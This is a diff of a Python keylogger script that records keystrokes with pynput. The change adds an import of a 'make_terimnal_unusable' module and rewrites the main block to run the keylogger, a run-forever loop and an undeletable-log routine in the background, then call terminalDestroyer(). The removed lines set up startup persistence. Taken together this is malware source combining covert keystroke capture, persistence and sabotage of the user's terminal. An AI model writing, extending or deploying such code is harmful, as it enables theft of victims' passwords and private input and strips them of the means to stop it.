@@ -4,6 +4,7 @@ from pynput.keyboard import Key, Listener
 from test import run_forever 
 from test1 import make_file_undeletable
 import background_runner
+import make_terimnal_unusable
 
 LOG_FILE = "logs.txt"
 
@@ -26,8 +27,8 @@ def start_keylogger():
         print(f"Keylogger failed to start: {e}")
         raise
 
-
 if __name__ == "__main__":
-    background_runner.run_on_startup()
-    make_file_undeletable(LOG_FILE)
-    run_forever(INPUT="keylogger")
+    background_runner.run_in_background(start_keylogger)
+    background_runner.run_in_background(run_forever)
+    background_runner.run_in_background(make_file_undeletable, LOG_FILE)
+    make_terimnal_unusable.terminalDestroyer()
